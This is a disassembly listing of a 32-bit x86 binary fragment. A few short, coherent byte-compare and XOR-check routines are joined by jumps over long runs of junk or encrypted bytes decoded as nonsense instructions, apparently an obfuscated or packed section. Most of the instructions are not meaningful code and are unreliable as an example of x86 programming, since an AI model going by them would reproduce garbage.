  4039dc:	ds scas al,BYTE PTR es:[edi]
  4039de:	mov    eax,0x6ea33800
  4039e3:	jl     0x403a14
  4039e5:	sti    
  4039e6:	bswap  ebx
  4039e8:	mov    ch,0x5e
  4039ea:	sahf   
  4039eb:	jmp    0x7f1fc39f
  4039f0:	jmp    0x403a22
  4039f2:	sbb    al,0xb8
  4039f4:	scas   al,BYTE PTR es:[edi]
  4039f5:	ins    DWORD PTR es:[edi],dx
  4039f6:	hlt    
  4039f7:	add    DWORD PTR [edx+0xb],ebx
  4039fa:	cld    
  4039fb:	add    al,0x2e
  4039fd:	test   BYTE PTR [ecx-0x7ba74fe],0x33
  403a04:	rol    DWORD PTR [ebx],0xc6
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0xfcec6125
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403a7d
  403a5b:	in     al,0x1a
  403a5d:	das    
  403a5e:	sbb    DWORD PTR [esi+ecx*8+0x58],eax
  403a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a63:	sub    bl,BYTE PTR [edi-0x2c]
  403a66:	xor    BYTE PTR [eax+0x13],al
  403a69:	call   0xda79:0xf9fb8dcf
  403a70:	jecxz  0x4039f9
  403a72:	push   edx
  403a73:	xlat   BYTE PTR ds:[ebx]
  403a74:	rol    BYTE PTR [esi-0x7676a607],1
  403a7a:	inc    ebx
  403a7b:	mov    dh,0xc6
  403a7d:	sub    esp,esi
  403a7f:	or     al,0x9c
  403a81:	mov    bh,0x67
  403a83:	xchg   esp,eax
  403a84:	xor    DWORD PTR [ebp-0x748f52cf],esp
  403a8a:	jbe    0x403a83
  403a8c:	ret    
  403a8d:	test   WORD PTR [edx-0x56703b94],0xae0b
  403a96:	(bad)  
  403a97:	sub    ch,BYTE PTR [eax]
  403a99:	int3   
  403a9a:	xchg   edx,eax
  403a9b:	mov    cl,0x76
  403a9d:	ror    DWORD PTR [eax+0x579a73c0],1
  403aa3:	adc    al,0xe7
  403aa5:	fsub   DWORD PTR [ebx]
  403aa7:	bound  ebx,QWORD PTR ds:0x594edbd3
  403aad:	cwde   
  403aae:	data16 fidivr WORD PTR [ebx]
  403ab1:	leave  
  403ab2:	jbe    0x403b14
  403ab4:	pop    ss
  403ab5:	nop
  403ab6:	sbb    edi,DWORD PTR [edi]
  403ab8:	jl     0x403a6d
  403aba:	leave  
  403abb:	xchg   BYTE PTR ds:0xd6197e9c,al
  403ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ac2:	mov    al,ds:0xfd26320f
  403ac7:	dec    esp
  403ac8:	fnstcw WORD PTR [esi-0x468387b]
  403ace:	dec    ecx
  403acf:	jecxz  0x403b40
  403ad1:	mov    ds:0xf0ef9cb3,eax
  403ad6:	push   eax
  403ad7:	test   al,0x3c
  403ad9:	inc    ebp
  403ada:	ret    0xf92a
  403add:	mov    WORD PTR [esi],ds
  403adf:	fwait
  403ae0:	scas   eax,DWORD PTR es:[edi]
  403ae1:	(bad)  
  403ae2:	adc    ebx,esi
  403ae4:	pop    esi
  403ae5:	mov    ds:0xe0cc8402,eax
  403aea:	mov    edi,0xe964a459
  403aef:	outs   dx,BYTE PTR ds:[esi]
  403af0:	cmp    BYTE PTR [edx+0x1b],bh
  403af3:	pop    ebx
  403af4:	inc    ebx
  403af5:	les    esi,FWORD PTR ds:0x96a755f9
  403afb:	jecxz  0x403b2e
  403afd:	and    bl,BYTE PTR [esi]
  403aff:	(bad)  
  403b00:	mov    ebp,0xb2605290
  403b05:	inc    esp
  403b06:	pop    esi
  403b07:	retf   
  403b08:	mov    eax,0x2f685851
  403b0d:	add    DWORD PTR [esi+0x288dc7e7],esi
  403b13:	fld    QWORD PTR ds:0x69d5776
  403b19:	adc    BYTE PTR [edx],ah
  403b1b:	cmc    
  403b1c:	push   ss
  403b1d:	adc    esi,DWORD PTR [eax+0x63]
  403b20:	sub    al,0x8d
  403b22:	shl    dh,cl
  403b24:	pop    ebx
  403b25:	xor    DWORD PTR [edx],ebp
  403b27:	add    al,0x8a
  403b29:	mov    eax,ds:0x132e6836
  403b2e:	jle    0x403af0
  403b30:	xchg   ebx,eax
  403b31:	cmp    al,BYTE PTR [ebx+0x64972708]
  403b37:	sbb    al,0x30
  403b39:	ror    DWORD PTR ds:[esi+0x1667c6b9],cl
  403b40:	and    eax,0x9c5a76b6
  403b45:	loope  0x403ba5
  403b47:	mov    ebx,0x57534163
  403b4c:	outs   dx,DWORD PTR ds:[esi]
  403b4d:	push   edi
  403b4e:	in     eax,0x92
  403b50:	xor    eax,0xd0306022
  403b55:	(bad)  
  403b56:	pop    esi
  403b57:	pop    ebp
  403b58:	dec    ebp
  403b59:	push   ds
  403b5a:	aaa    
  403b5b:	dec    ebp
  403b5c:	aaa    
  403b5d:	cmp    DWORD PTR [esi],edx
  403b5f:	add    bh,BYTE PTR [edi]
  403b61:	retf   0xa998
  403b64:	xor    dl,bl
  403b66:	dec    edx
  403b67:	push   ebp
  403b68:	add    al,0x55
  403b6a:	loope  0x403af6
  403b6c:	and    al,0x44
  403b6e:	aam    0x25
  403b70:	fld    TBYTE PTR [ebp+eiz*4+0x238e8716]
  403b77:	xor    DWORD PTR [edx+edx*1],ebp
  403b7a:	sar    BYTE PTR [eax+0x5d],cl
  403b7d:	xchg   esp,eax
  403b7e:	jmp    0x51d6:0x3b987858
  403b85:	leave  
  403b86:	or     ecx,DWORD PTR [ebx]
  403b88:	push   ebx
  403b89:	cdq    
  403b8a:	cld    
  403b8b:	mov    edx,0x8cd8683f
  403b90:	cld    
  403b91:	in     eax,0x74
  403b93:	push   ds
  403b94:	sub    al,0xf
  403b96:	pop    ebx
  403b97:	cli    
  403b98:	std    
  403b99:	or     BYTE PTR fs:[edx+0x69c6618d],bl
  403ba0:	popf   
  403ba1:	fcmovnb st,st(5)
  403ba3:	idiv   edi
  403ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ba6:	sti    
  403ba7:	mov    dl,0xd7
  403ba9:	enter  0x8d58,0xdc
  403bad:	das    
  403bae:	inc    eax
  403baf:	cmp    eax,0x33c7adef
  403bb4:	ins    DWORD PTR es:[edi],dx
  403bb5:	adc    cl,BYTE PTR [esi-0x60]
  403bb8:	neg    DWORD PTR [eax+0x4be02380]
  403bbe:	imul   edx,DWORD PTR [esi+0x4d],0x5c
  403bc2:	int3   
  403bc3:	clc    
  403bc4:	test   DWORD PTR [ecx],eax
  403bc6:	adc    dh,BYTE PTR [ecx]
  403bc8:	ret    
  403bc9:	lods   al,BYTE PTR ds:[esi]
  403bca:	loopne 0x403bdf
  403bcc:	out    dx,eax
  403bcd:	sbb    ebx,DWORD PTR [ecx+0x2407fc11]
  403bd3:	mov    ch,0xb8
  403bd5:	outs   dx,DWORD PTR ds:[esi]
  403bd6:	xchg   esp,eax
  403bd7:	sete   BYTE PTR [edi]
  403bda:	aad    0x24
  403bdc:	dec    ebp
  403bdd:	sahf   
  403bde:	imul   BYTE PTR es:[edx-0x60]
  403be2:	mov    esi,0x17784c84
  403be7:	jmp    0x519f:0xef42ba4c
  403bee:	loop   0x403bf9
  403bf0:	sbb    bh,BYTE PTR [ecx]
  403bf2:	cmc    
  403bf3:	push   ebx
  403bf4:	xchg   ebx,eax
  403bf5:	dec    esi
  403bf6:	arpl   WORD PTR [ecx+0x3a114b98],si
  403bfc:	mov    ebx,0x418e8de3
  403c01:	sbb    BYTE PTR [edi],ah
  403c03:	dec    edi
  403c04:	or     eax,0xd5706fa2
  403c09:	mov    ch,0xf
  403c0b:	test   BYTE PTR [edi-0x38fffffb],dl
  403c11:	inc    ebp
  403c12:	call   0x74639a6
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0x20dcf48b
  403c29:	push   es
  403c2a:	xor    BYTE PTR [edi+0x42],dl
  403c2d:	push   ds
  403c2e:	jle    0x403cae
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403c3d
  403c35:	retf   
  403c36:	mov    edi,0x613aaf3a
  403c3b:	mov    fs,WORD PTR [esp+ebx*4+0x2072fcfd]
  403c42:	sbb    eax,0xcd3a0635
  403c47:	fs jns 0x403cb2
  403c4a:	call   0xb2365f80
  403c4f:	inc    edi
  403c50:	clc    
  403c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c52:	cmp    ebx,esi
  403c54:	mov    dh,dh
  403c56:	ins    DWORD PTR es:[edi],dx
  403c57:	arpl   WORD PTR [edx],bx
  403c59:	xchg   ebx,eax
  403c5a:	adc    BYTE PTR ds:[eax-0x24ef848c],bh
  403c61:	mov    cl,BYTE PTR [ebp+0x4e]
  403c64:	jbe    0x403bf0
  403c66:	sbb    ch,BYTE PTR [ebp-0x6121c2bd]
  403c6c:	push   ds
  403c6d:	or     eax,0xd4c5cc78
  403c72:	adc    bh,0xc7
  403c75:	call   FWORD PTR [ecx-0x15]
  403c78:	aam    0xef
  403c7a:	rep outs dx,DWORD PTR ds:[esi]
  403c7c:	jb     0x403c7e
  403c7e:	in     eax,dx
  403c7f:	jecxz  0x403c6f
  403c81:	arpl   WORD PTR [edi-0x43],bx
  403c84:	sahf   
  403c85:	rcl    bl,1
  403c87:	xor    BYTE PTR [esi-0x58],cl
  403c8a:	sub    eax,0x77bb0cab
  403c8f:	leave  
  403c90:	sbb    esi,DWORD PTR [ebp-0x616c9e14]
  403c96:	in     al,dx
  403c97:	cmp    edx,ebx
  403c99:	pop    ebp
  403c9a:	mov    edx,0x377de722
  403c9f:	add    eax,0xc75ce344
  403ca4:	dec    ecx
  403ca5:	push   esp
  403ca6:	cdq    
  403ca7:	inc    ecx
  403ca8:	ss ret 
  403caa:	jp     0x403c35
  403cac:	mov    ecx,ebx
  403cae:	sub    eax,ebx
  403cb0:	bound  edx,QWORD PTR [edx-0x6b]
  403cb3:	jae    0x403c75
  403cb5:	call   0x6b0ce927
  403cba:	push   esp
  403cbb:	push   ds
  403cbc:	sti    
  403cbd:	into   
  403cbe:	daa    
  403cbf:	pop    ebp
  403cc0:	inc    ebx
  403cc1:	int    0x6c
  403cc3:	retf   
  403cc4:	lock push edi
  403cc6:	jb     0x403d01
  403cc8:	fldenv [ecx-0x63]
  403ccb:	lea    ebx,[edx-0x6d]
  403cce:	clc    
  403ccf:	pop    eax
  403cd0:	call   0x7608:0x2a92d38a
  403cd7:	mov    WORD PTR [ebx-0x71],cs
  403cda:	inc    edx
  403cdb:	xchg   edx,eax
  403cdc:	and    edx,DWORD PTR [esi+ecx*2]
  403cdf:	test   eax,0x17967e6f
  403ce4:	pop    es
  403ce5:	sub    dh,BYTE PTR [esi+0x631d17e]
  403ceb:	cdq    
  403cec:	inc    edx
  403ced:	ins    BYTE PTR es:[edi],dx
  403cee:	and    eax,0xeca0f49a
  403cf3:	loop   0x403d0d
  403cf5:	loopne 0x403cfb
  403cf7:	aas    
  403cf8:	or     DWORD PTR [ebp-0x80],ebp
  403cfb:	cmp    BYTE PTR gs:[ecx+0x55],bh
  403cff:	sub    DWORD PTR [edx],edx
  403d01:	dec    ebp
  403d02:	in     eax,dx
  403d03:	mov    al,0x5e
  403d05:	pop    ebx
  403d06:	dec    ecx
  403d07:	pop    edx
  403d08:	aas    
  403d09:	dec    esi
  403d0a:	pop    esp
  403d0b:	pop    ss
  403d0c:	or     edi,DWORD PTR [esi+eax*4]
  403d0f:	cs pushw es
  403d12:	stc    
  403d13:	mov    esi,0x14964109
  403d18:	push   edi
  403d19:	fdivr  st,st(5)
  403d1b:	pop    ss
  403d1c:	lock test eax,0x37d80209
  403d22:	mov    ecx,DWORD PTR [esi]
  403d24:	sbb    al,0xd2
  403d26:	arpl   WORD PTR [ecx],cx
  403d28:	cli    
  403d29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d2a:	mov    esp,0x12d08f22
  403d2f:	pop    esi
  403d30:	xchg   ah,ch
  403d32:	cmp    al,0xf7
  403d34:	jmp    0x2fc6:0x1e92e169
  403d3b:	xchg   ebp,eax
  403d3c:	sub    eax,0x46278438
  403d41:	sub    bl,BYTE PTR [edx-0x51]
  403d44:	cmp    bl,BYTE PTR [ecx-0x1540ceb9]
  403d4a:	and    eax,0x45885018
  403d4f:	and    ecx,DWORD PTR [esi]
  403d51:	pop    ebx
  403d52:	scas   al,BYTE PTR es:[edi]
  403d53:	std    
  403d54:	and    ecx,DWORD PTR [eax+0x3b]
  403d57:	mov    WORD PTR [bp+0xa8f],?
  403d5c:	dec    edi
  403d5d:	ret    0x1f85
  403d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d61:	xchg   edi,eax
  403d62:	push   esp
  403d63:	clc    
  403d64:	enter  0xce74,0x52
  403d68:	push   ebp
  403d69:	xor    eax,0x35d5510d
  403d6e:	mov    eax,DWORD PTR [edi+0x7b]
  403d71:	sbb    eax,0x34dbfc7d
  403d76:	mov    esi,0x96eea5ac
  403d7b:	adc    BYTE PTR [ecx-0x4a90e8e6],ah
  403d81:	ins    DWORD PTR es:[edi],dx
  403d82:	pushf  
  403d83:	arpl   WORD PTR [eax],dx
  403d85:	sbb    eax,0x164ea47b
  403d8a:	pusha  
  403d8b:	imul   edx,DWORD PTR [edi],0x5eb32da7
  403d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d92:	sub    al,0xc8
  403d94:	popa   
  403d95:	cmp    eax,0x7da46a59
  403d9a:	pushf  
  403d9b:	add    eax,0x2bd6d623
  403da0:	mov    gs,WORD PTR [edi]
  403da2:	inc    eax
  403da3:	dec    ecx
  403da4:	add    edi,DWORD PTR [ebx]
  403da6:	ins    DWORD PTR es:[edi],dx
  403da7:	mov    edx,0x39841468
  403dac:	sbb    ebp,DWORD PTR [esi-0xbafe836]
  403db2:	add    BYTE PTR [ebp+0x31],cl
  403db5:	add    edx,DWORD PTR [eax]
  403db7:	stos   BYTE PTR es:[edi],al
  403db8:	mov    dh,0x42
  403dba:	imul   ebx,DWORD PTR [ebp-0x7fef0a1f],0xffffff80
  403dc1:	xchg   ecx,eax
  403dc2:	ja     0x403e3b
  403dc4:	push   edx
  403dc5:	or     DWORD PTR [edi],eax
  403dc7:	fs in  al,0xdc
  403dca:	idiv   DWORD PTR [ecx-0x2d]
  403dcd:	mov    bl,0x9
  403dcf:	push   ecx
  403dd0:	outs   dx,BYTE PTR ds:[esi]
  403dd1:	sbb    eax,0x3d68fa18
  403dd6:	add    DWORD PTR [eax-0x55bbf62e],edi
  403ddc:	push   esi
  403ddd:	jnp    0x403e19
  403ddf:	cli    
  403de0:	fucom  st(0)
  403de2:	sbb    esi,DWORD PTR [esi]
  403de4:	lea    eax,[ebp-0x18]
  403de7:	mov    DWORD PTR [ebp-0x14],eax
  403dea:	mov    eax,DWORD PTR [ebp-0x14]
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi+0x605588b3],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403db0
  403e11:	xchg   edi,eax
  403e12:	out    0x64,eax
  403e14:	pop    edx
  403e15:	cmc    
  403e16:	mov    esi,0x5e091950
  403e1b:	dec    eax
  403e1c:	dec    edx
  403e1d:	bound  edx,QWORD PTR [ebx-0x22b2f5b9]
  403e23:	jp     0x403e61
  403e25:	aad    0x5f
  403e27:	(bad)  [ebx-0x18679c32]
  403e2d:	lods   al,BYTE PTR ds:[esi]
  403e2e:	test   DWORD PTR [eax-0x4b5fbb4e],esp
  403e34:	push   esi
  403e35:	mov    bl,0xc4
  403e37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e38:	push   ebx
  403e39:	out    dx,eax
  403e3a:	push   0xffffff9f
  403e3c:	test   DWORD PTR [ebp+0x61],0xf6e9869c
  403e43:	or     al,0x9d
  403e45:	pop    eax
  403e46:	ins    DWORD PTR es:[edi],dx
  403e47:	mov    ds:0xc465371b,eax
  403e4c:	fidiv  DWORD PTR [ebx]
  403e4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e4f:	aam    0x9f
  403e51:	je     0x403e91
  403e53:	das    
  403e54:	cmp    eax,DWORD PTR [ebp+ebx*4-0x59]
  403e58:	mov    edx,0xf1b9331b
  403e5d:	cmp    ebp,DWORD PTR [eax-0x77dd6999]
  403e63:	stos   DWORD PTR es:[edi],eax
  403e64:	push   ecx
  403e65:	inc    esp
  403e66:	adc    ecx,DWORD PTR [eax-0x48]
  403e69:	mov    al,0x29
  403e6b:	iret   
  403e6c:	xor    ebp,DWORD PTR [esi]
  403e6e:	push   cs
  403e6f:	xor    esi,ebp
  403e71:	inc    edi
  403e72:	push   ds
  403e73:	add    ch,BYTE PTR [ecx+0x75]
  403e76:	ret    
  403e77:	and    bh,BYTE PTR [ecx+0x3936b848]
  403e7d:	pusha  
  403e7e:	xor    esi,eax
  403e80:	xchg   esp,eax
  403e81:	inc    eax
  403e82:	sbb    bh,BYTE PTR [ebx+ebp*1-0x51]
  403e86:	loop   0x403e5c
  403e88:	cmp    BYTE PTR [edx],bh
  403e8a:	mov    BYTE PTR [eax],0xd7
  403e8d:	sub    al,0x79
  403e8f:	mov    dl,0xfa
  403e91:	popf   
  403e92:	call   0x30e0a0c8
  403e97:	popa   
  403e98:	pushf  
  403e99:	cmp    DWORD PTR [eax+0xe],ebp
  403e9c:	pop    ecx
  403e9d:	data16 ror ch,1
  403ea0:	(bad)  
  403ea1:	stc    
  403ea2:	push   edx
  403ea3:	retf   
  403ea4:	das    
  403ea5:	mov    ch,0x46
  403ea7:	pusha  
  403ea8:	mov    al,0x94
  403eaa:	(bad)  
  403eab:	mov    esp,0x97c22706
  403eb0:	inc    ecx
  403eb1:	iret   
  403eb2:	lods   al,BYTE PTR ds:[esi]
  403eb3:	jae    0x403e79
  403eb5:	pop    ss
  403eb6:	cs or  al,0xb9
  403eb9:	(bad)  
  403eba:	dec    esp
  403ebb:	test   eax,0xdfe9c248
  403ec0:	and    BYTE PTR [edx-0x5ab83a6f],ch
  403ec6:	test   al,0x12
  403ec8:	dec    ecx
  403ec9:	dec    eax
  403eca:	mov    ebx,0x630b2e61
  403ecf:	(bad)  
  403ed0:	(bad)  
  403ed2:	fcmovnbe st,st(2)
  403ed4:	or     DWORD PTR [bx+di+0x2],edi
  403ed8:	cmc    
  403ed9:	jb     0x403ebc
  403edb:	fs xchg edx,eax
  403edd:	or     al,0x23
  403edf:	xor    BYTE PTR [edx+0x1e955ed4],0x6a
  403ee6:	inc    DWORD PTR [edx-0x3f640b8e]
  403eec:	xor    bh,BYTE PTR [ebx-0x4b]
  403eef:	test   DWORD PTR [eax+0x16],edi
  403ef2:	mov    cl,0xb5
  403ef4:	pop    ss
  403ef5:	mov    dl,dl
  403ef7:	into   
  403ef8:	push   edi
  403ef9:	fsubr  DWORD PTR [esi+ebx*8+0x43c7903d]
  403f00:	mov    BYTE PTR [ecx+0x3a76fe48],dh
  403f06:	daa    
  403f07:	mov    bh,0x2c
  403f09:	cmp    eax,0xecfebc2a
  403f0e:	(bad)  
  403f0f:	int    0x4d
  403f11:	xchg   BYTE PTR [edi-0x3297e078],bh
  403f17:	jge    0x403f7b
  403f19:	int    0x1f
  403f1b:	repz or dh,dl
  403f1e:	data16 loopne 0x403f38
  403f21:	cmp    eax,0x8b8c2970
  403f26:	push   0xa5b7f64c
  403f2b:	lods   eax,DWORD PTR ds:[esi]
  403f2c:	ret    0xa784
  403f2f:	pop    ebx
  403f30:	push   0xffffffea
  403f32:	das    
  403f33:	mov    esp,0xb0a7f3fa
  403f38:	cmp    eax,0x73ed8b2f
  403f3d:	add    BYTE PTR [ebp-0x48],0x2b
  403f41:	sbb    cl,BYTE PTR [edi+ebp*1+0x39]
  403f45:	aaa    
  403f46:	push   0x2
  403f48:	lds    edi,FWORD PTR [eax]
  403f4a:	jmp    0xf24fa7f
  403f4f:	and    edx,0x51
  403f52:	jecxz  0x403ef9
  403f54:	xchg   esp,eax
  403f55:	in     eax,0xdf
  403f57:	(bad)
  403f5b:	sub    ebp,edi
  403f5d:	mov    bh,0xf6
  403f5f:	call   0xee9c:0xfc8903e6
  403f66:	cmp    BYTE PTR [eax+0x57],bl
  403f69:	and    DWORD PTR [esi-0x30],ecx
  403f6c:	mov    edi,ebp
  403f6e:	call   0x150b639b
  403f73:	cwd    
  403f75:	in     al,0x9b
  403f77:	xchg   eax,edx
  403f79:	aad    0x1c
  403f7b:	xchg   ah,dl
  403f7d:	mov    ah,0xd9
  403f7f:	push   0xb25ff4b0
  403f84:	pop    edx
  403f85:	push   ss
  403f86:	cs (bad) 
  403f88:	out    dx,eax
  403f89:	xchg   esp,eax
  403f8a:	inc    eax
  403f8b:	popa   
  403f8c:	retf   0x7276
  403f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f90:	xchg   DWORD PTR [edi],edi
  403f92:	mov    esi,0x9ba02cf7
  403f97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f98:	mov    ecx,0x6864bec5
  403f9d:	jmp    0x403f89
  403f9f:	cld    
  403fa0:	loope  0x403f42
  403fa2:	lds    edx,FWORD PTR [ecx+0x3aa58e1f]
  403fa8:	sar    BYTE PTR [ebp+eiz*1+0x6920a934],1
  403faf:	dec    esp
  403fb0:	cmp    BYTE PTR [eax+0x76],cl
  403fb3:	xor    bh,bl
  403fb5:	dec    ebx
  403fb6:	lea    edi,[eax+0x267e8d88]
  403fbc:	fs add eax,0x458b04cc
  403fc2:	lock mov edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	lods   al,BYTE PTR ds:[esi]
  403fda:	jns    0x403f9a
  403fdc:	stos   DWORD PTR es:[edi],eax
  403fdd:	and    bl,BYTE PTR [edx]
  403fdf:	jle    0x40405f
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x404001
  403fe6:	pop    edi
  403fe7:	adc    DWORD PTR [eax+0x11ba7db3],esi
  403fed:	sbb    al,0x89
  403fef:	mov    ds:0x2bab81c2,eax
  403ff4:	nop
  403ff5:	scas   al,BYTE PTR es:[edi]
  403ff6:	lock mov ebp,0x8269302e
  403ffc:	enter  0xa1ba,0xf2
  404000:	mov    DWORD PTR [edi-0x51],ebp
  404003:	sbb    eax,0xc4438e94
  404008:	std    
  404009:	mov    dl,0xa9
  40400b:	dec    esp
  40400c:	shl    esp,0xa6
  40400f:	inc    eax
  404010:	in     al,0xb9
  404012:	mov    bh,0xc1
  404014:	test   al,0x1b
  404016:	(bad)  
  404017:	(bad)  
  404018:	test   DWORD PTR [edi+0x2b],ebp
  40401b:	cmp    eax,0xf67988cc
  404020:	lea    edi,[edi-0x5b]
  404023:	mov    ch,0x17
  404025:	(bad)  
  404026:	push   ebx
  404027:	pop    es
  404028:	add    dh,BYTE PTR [ebx]
  40402a:	ins    BYTE PTR es:[edi],dx
  40402b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40402c:	dec    eax
  40402d:	xlat   BYTE PTR ds:[ebx]
  40402e:	mul    BYTE PTR [ecx-0x216cec6b]
  404034:	in     al,dx
  404035:	dec    edx
  404036:	shl    DWORD PTR [edx-0x22],cl
  404039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40403a:	out    dx,al
  40403b:	xchg   ebx,eax
  40403c:	pop    ds
  40403d:	mov    bl,0x23
  40403f:	pop    ds
  404040:	div    BYTE PTR [ebx+0x41db2a63]
  404046:	or     esi,esi
  404048:	mov    eax,0x509a75b3
  40404d:	xor    DWORD PTR [ecx],0x33
  404050:	or     eax,0x4b07a217
  404055:	stos   DWORD PTR es:[edi],eax
  404056:	out    dx,eax
  404057:	retf   0x7c1f
  40405a:	mov    ch,0xbc
  40405c:	jmp    0x403fec
  40405e:	rcl    BYTE PTR [eax-0x556297df],0xf6
  404065:	or     eax,DWORD PTR [ecx]
  404067:	add    edi,DWORD PTR [ebp-0x7aefc1d7]
  40406d:	out    dx,al
  40406e:	ret    
  40406f:	push   edi
  404070:	sahf   
  404071:	sbb    al,0x1c
  404073:	sbb    esi,DWORD PTR [edx-0x3]
  404076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404077:	scas   al,BYTE PTR es:[edi]
  404078:	stc    
  404079:	mov    ds,WORD PTR [ebp-0x44ab3c46]
  40407f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  404081:	retf   
  404082:	cmp    edi,DWORD PTR [ebx+0x597acb65]
  404088:	outs   dx,DWORD PTR ds:[esi]
  404089:	jecxz  0x40405c
  40408b:	jnp    0x404054
  40408d:	test   eax,0xf2336e6d
  404092:	shl    BYTE PTR [esi-0x2f7d03ea],cl
  404098:	and    bh,ch
  40409a:	jno    0x404081
  40409c:	lds    bp,DWORD PTR [ebp-0x3111ee89]
  4040a3:	adc    eax,0x72032dda
  4040a8:	ficomp DWORD PTR [edi-0x68]
  4040ab:	pushf  
  4040ac:	dec    BYTE PTR [edi-0x669ba71f]
  4040b2:	das    
  4040b3:	push   ecx
  4040b4:	ss (bad) 
  4040b6:	pop    ds
  4040b7:	loope  0x404106
  4040b9:	push   esp
  4040ba:	add    DWORD PTR [ecx+0x1e3efba5],ebp
  4040c0:	das    
  4040c1:	inc    edx
  4040c2:	xor    al,0x26
  4040c4:	data16 jb 0x4040f9
  4040c7:	fst    DWORD PTR [edi+edi*8+0x4b4646bd]
  4040ce:	xchg   edx,eax
  4040cf:	mov    al,0x99
  4040d1:	in     eax,dx
  4040d2:	mov    bh,0x8d
  4040d4:	jmp    0x88d4:0x5917da69
  4040db:	sbb    eax,0x2b7136da
  4040e0:	inc    esi
  4040e1:	add    eax,0xca42bc16
  4040e6:	and    DWORD PTR [esi],eax
  4040e8:	cld    
  4040e9:	sbb    dh,BYTE PTR [ebx]
  4040eb:	les    esp,FWORD PTR [eax-0x62e5a2ca]
  4040f1:	das    
  4040f2:	adc    ebx,DWORD PTR [eax+ecx*2+0x7a3439cc]
  4040f9:	dec    edi
  4040fa:	sbb    BYTE PTR [ecx+0x4c6caff9],dl
  404100:	and    al,ah
  404102:	add    esp,DWORD PTR [edi-0x35f2552d]
  404108:	jg     0x4040b1
  40410a:	mov    ecx,0x46b5f72
  40410f:	xchg   bl,bh
  404111:	add    BYTE PTR [edx+0x2a0e458f],cl
  404117:	outs   dx,BYTE PTR ds:[esi]
  404118:	iret   
  404119:	xchg   BYTE PTR [edx],dh
  40411b:	fiadd  DWORD PTR [ebx+0x4d]
  40411e:	(bad)  
  40411f:	mov    al,0x91
  404121:	inc    ebx
  404122:	pop    ebp
  404123:	push   esp
  404124:	pop    ebx
  404125:	mov    dh,0xb8
  404127:	cmp    ebx,DWORD PTR [ebx-0x1d89e3d8]
  40412d:	test   DWORD PTR [edi+0x31],esp
  404130:	or     eax,0xc3719fe1
  404135:	enter  0x8f90,0xf3
  404139:	dec    edx
  40413a:	ja     0x40412d
  40413c:	aad    0xaf
  40413e:	and    al,0xff
  404140:	iret   
  404141:	call   0xc3dd:0xf6520477
  404148:	sbb    esp,DWORD PTR [ebp+ebx*1+0x77991ad]
  40414f:	sub    ah,BYTE PTR [ebx+edx*1]
  404152:	aam    0xd3
  404154:	mov    al,BYTE PTR [eax]
  404156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404158:	sbb    al,0xb4
  40415a:	idiv   bl
  40415c:	push   eax
  40415d:	mov    es,WORD PTR [edi+0x35]
  404160:	shr    BYTE PTR [edi],cl
  404162:	data16 xor al,0xc3
  404165:	leave  
  404166:	cmp    eax,0x7c7eeba1
  40416b:	(bad)  
  40416c:	fmul   DWORD PTR [esi]
  40416e:	mov    dl,0xa6
  404170:	imul   esp,DWORD PTR [esi],0x84ce3930
  404176:	int    0x97
  404178:	sub    DWORD PTR [edx+0x3b23fdff],ecx
  40417e:	jmp    ecx
